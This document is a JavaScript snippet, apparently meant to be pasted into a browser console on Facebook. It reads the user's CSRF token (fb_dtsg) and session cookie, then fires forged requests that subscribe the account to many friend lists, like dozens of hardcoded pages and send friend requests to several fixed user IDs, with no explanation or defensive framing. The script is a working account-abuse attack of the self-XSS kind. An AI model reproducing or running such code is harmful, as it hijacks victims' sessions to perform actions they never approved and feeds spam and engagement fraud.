/*Follow List*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function LIST(L) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
  var XParams = "flid=" + L +"&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user="+user_id+"&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
LIST("312907035509203");
LIST("567376543307348");
LIST("562836113761391");
LIST("352246548208596");
LIST("4399231940310");
LIST("10200819572312984");
LIST("10200820950347434");
LIST("10200819976883098");
LIST("10200865018889120");
LIST("466396010097340");
LIST("466380243430111");
LIST("381489938632591");
LIST("611411958872392");
LIST("551467628239578");
LIST("358808870905474");
LIST("325715414223519");
LIST("538818886161261");
LIST("156489554515051");
LIST("359722610800552");
LIST("146971562150041");
LIST("503774323004340");
LIST("177777859044364");
LIST("296332940501763");
LIST("252854598187657");
LIST("461311090622996");
LIST("452505254839947");
LIST("577657768945892");
LIST("187420968074311"); 
LIST("529897107069041"); 
LIST("174006526095409"); 
LIST("134985716695149"); 
LIST("134703450056709"); 
LIST("292061244263668");
LIST("129137250622385");
LIST("207200769427300");
LIST("340613049401880");
LIST("344495279013657");
LIST("344496235680228");
LIST("399019036879681");
LIST("245094282297376");
LIST("279163185561807");
LIST("254790537994417");
LIST("277815575688383");
LIST("599238170088731");
LIST("358317087623422");
LIST("186680718157525");
LIST("116578281885865");
LIST("611422528882551");
LIST("546843878712190");
LIST("546855828710995");
LIST("546856865377558");
LIST("546857058710872");
LIST("546857278710850");
LIST("199297846887404");
LIST("348918845211180");
LIST("348918355211229");
LIST("394251000690433");
LIST("514864885218030");
LIST("400948830018038");
LIST("393805470734986");
LIST("529897107069041");
LIST("541111455947606");
LIST("541112019280883");
LIST("541111775947574");
LIST("275894579224072");
LIST("275894212557442");
LIST("476227175799373");
LIST("591619340883068");
LIST("591619047549764");
LIST("591619694216366");
LIST("591621524216183");
LIST("591619460883056");
LIST("591623140882688");
LIST("591624280882574");
LIST("591619600883042");
LIST("591620727549596");
LIST("591619047549764");
LIST("591624687549200");
LIST("186680718157525");
List("120701391459709");
LIST("591625247549144");
LIST("315377045264019");
LIST("315376825264041");
LIST("592694070775595");
LIST("592695127442156");
LIST("466664513418987");
LIST("1389670604580645");
/*Like Page*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function Like(p) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
Like("313072532101076");
Like("190451517757758");
Like("595580513789645");
Like("300241633420701");
Like("231125826929893");
Like("456401041060837");
Like("523004351084154");
Like("229353647087574");
Like("229488947108546");  
Like("205908352819272");   
Like("313072532101076");  
Like("209464459125570");  
Like("523004351084154");   
Like("200776629976061");  
Like("147857465295449");  
Like("163588093717517");  
Like("291092130903328");  
Like("429143760437630");  
Like("149394451859931");
Like("306495312809675");   
Like("238044532932475");
Like("533658463364561");
Like("528019587257023");
Like("114432912090688");
Like("165411580286132");
Like("333193263435488");
Like("104142816349744");
Like("379373108754478");
Like("569302423102592");
Like("234982333218667");
Like("456483724412226");
Like("136785296514054");
Like("146320572185345");
Like("150423395088679");
Like("651209744905814");
Like("605644426114536");
Like("476744145734993");
Like("190943597728424");
Like("127402680785850");
Like("453718184719532");
Like("177430755751025");
Like("110871649075947");
Like("280308438768084");
Like("175177679305434");
Like("122109094662677");
Like("567227273316419");

/*Add Friend*/ 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
IDS("100004021942009");
IDS("100003977780572");
IDS("100004043843895");
IDS("100004121340012");
